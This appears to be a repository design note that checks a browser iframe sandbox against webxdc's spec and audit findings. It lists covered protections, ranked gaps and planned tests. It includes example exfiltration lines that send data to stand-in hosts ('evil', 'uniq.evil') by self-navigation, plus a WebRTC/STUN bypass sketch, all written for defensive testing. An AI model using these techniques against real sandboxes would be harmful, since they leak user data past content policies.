# webxdc-derived sandbox conformance oracle + gap analysis

webxdc (the Delta Chat "mini app" runtime) has shipped a browser-content sandbox through **four public
security audits** (Cure53 / OpenTech Fund, findings XDC-01…07). Its spec + audit findings are a ready-made
**conformance oracle** for this sandbox: every isolation rule it mandates and every bypass its audits found
becomes a requirement we can test against. This doc extracts that oracle and maps it to this repo's current
implementation.

**Reuse note:** webxdc's own sandbox is **not liftable** — its isolation is implemented per host and coupled
to native (Tauri `webxdc://` scheme handler / Android WebView / iOS WKWebView) or a server backend
(`webxdc-dev`'s Express). None is portable to a no-backend `srcdoc` design. So we **learn** (use its spec +
audits as this oracle), we do **not** adopt its code. This sandbox's browser primitives (opaque origin +
immutable per-session CSP) are in fact *stronger* than webxdc on storage isolation and Service-Worker
registration; the gaps below are where webxdc is currently ahead.

Sources: webxdc spec (webxdc.org/docs/spec, messenger-implementation §); Cure53/OTF 2023 audit
(delta.chat/en/2023-05-22-webxdc-security, XDC-01…07); Delta Chat WebRTC/realtime threads; deltachat-tauri
scheme handler.

## Conformance checklist (verified against `src/`)

| Requirement / bypass | Source | Status | Where |
|---|---|---|---|
| Deny all internet by default (fetch/XHR/beacon) | Spec; Impl | **COVERED** | `host.ts` `default-src 'none'` + empty `connect-src` |
| Block WebSockets (`ws:`/`wss:`) | audit-adjacent | **COVERED** | falls to `default-src 'none'`; test `04_websocket_bypass` |
| **WebRTC cannot exfiltrate** (ICE/STUN/TURN bypass `connect-src`) | **Audit (WebRTC)** | **GAP #1** | no `RTCPeerConnection` deletion, no `webrtc` directive |
| **Worker-mode network containment** | own TODO | **GAP #2** | `host.ts:196` — worker spawns on host origin ("this is wrong!") |
| **External self-navigation exfil** (`location.href='https://evil/?secret'`, `<a>` clicks) | **Spec (confirm links)** | **GAP #3** | no interception layer; not governed by `connect-src` |
| **VFS Service-Worker MIME + `nosniff`** (sniff→CSP escape) | **XDC-05, Impl** | **GAP #4** | `src/virtual-files/sw.ts:61-63` hardcodes `text/javascript`, no `nosniff`, `ACAO:'*'` |
| DNS-prefetch exfiltration | XDC-01/03 | **GAP (minor)** | no `x-dns-prefetch-control: off` meta |
| `Permissions-Policy` / explicit `allow=""` (deny camera/mic/geo…) | Impl | **PARTIAL** | default-denied (no `allow=`), but no explicit `allow=""` |
| PDF/plugin-in-iframe CSP bypass (`<object>`/`<embed>`) | XDC-05 | **COVERED** | `object-src`/`frame-src` → `'none'`; test `01_csp_bypass` |
| Missing-CSP on local resources | XDC-07 | **GAP (defense-in-depth)** | VFS SW responses carry no CSP header (direct-nav deny page exists) |
| Storage isolated + no cross-instance leak | Spec | **COVERED (stronger)** | fresh opaque origin; `localStorage` throws; test `03_storage_sharing` |
| No Service-Worker registration by untrusted code | Spec; Impl | **COVERED** | opaque `null` origin; test `02_sw_tampering` |
| No parent/opener/top access | Spec | **COVERED** | no `allow-same-origin`; test `05_outer_frame_tampering` |
| No top-navigation | Spec | **COVERED** | `allow-top-navigation` filtered; test `07_data_uri_navigation` |
| `<base>` hijack | — | **COVERED** | `base-uri` → `'none'`; test `10_base_tag_hijacking` |
| Form-action exfil | Impl | **COVERED** | `form-action` → `'none'` (add explicit test) |
| `registerProtocolHandler` / modals | — | **COVERED** | test `06_protocol_handlers` |
| Deny dangerous sandbox flags (`allow-same-origin`/`-top-navigation`/`-popups-escape`) | Impl | **COVERED** | capability allowlist in `csp-directives.ts` |
| DoS / session exhaustion | audit | **N/A** | no backend/server session state (`08_session_exhaustion` is legacy) |
| DevTools restriction (XDC-04); `selfAddr` spoofing (XDC-06); `webxdc.js` API; required `localStorage` | audit; Spec | **N/A** | Electron-/app-format-specific; storage is a deliberate stricter divergence |

## Gaps to close (ranked) — with the test to add

1. **WebRTC exfiltration** — `RTCPeerConnection` (STUN/TURN/ICE) tunnels past `connect-src`. Delete
   `RTCPeerConnection`/`webkitRTCPeerConnection` in the injected bridge (`src/lib/in-sandbox-script.ts`) —
   the iOS/WKWebView approach — and add `webrtc 'block'` where supported. **Test (new `11_webrtc_exfil`):**
   in iframe mode, `new RTCPeerConnection({iceServers:[{urls:'stun:…'}]})` + `createOffer()` yields no
   srflx/host candidate reaching a STUN server (or the API is absent).
2. **Worker-mode network escape** — `host.ts:195-218` spawns the worker on the host origin. Nest it inside
   the opaque iframe. **Test:** `fetch`/`importScripts`/`WebSocket` from the worker are blocked by the
   *sandbox* CSP, not the host's. (Current `worker-security.spec` passes only because the host page is
   CSP-locked — a false assurance.)
3. **External self-navigation exfil** — add a link-interception/confirm shim (the spec's mandatory "confirm
   every external link"). **Test (new `12_self_navigation_exfil`):** `location.href='https://uniq.evil/?x'`
   and an `<a target=_self>` click produce no request to `uniq.evil`.
4. **VFS Service-Worker MIME/`nosniff`** — `sw.ts:60-64`: add a per-extension MIME map + `X-Content-Type-
   Options: nosniff`, and tighten `Access-Control-Allow-Origin`. **Test:** SW responses carry `nosniff` + the
   correct MIME.
5. **`Permissions-Policy`/`allow=""` + DNS-prefetch-off** — add `allow=""` on the sandbox iframe (or a
   `Permissions-Policy` meta) + `<meta http-equiv="x-dns-prefetch-control" content="off">` in the security
   injection. **Test:** `navigator.geolocation`/`getUserMedia` reject; no DNS hit from an off-screen `<a>`.

## Notes
- The self-navigation gap (#3) is reasoned from CSP semantics (no `navigate-to` support; self-navigation
  needs no `allow-top-navigation`) — confirm per-browser with the added test.
- These findings were mapped against the source at the time of writing; re-verify line references before
  editing.
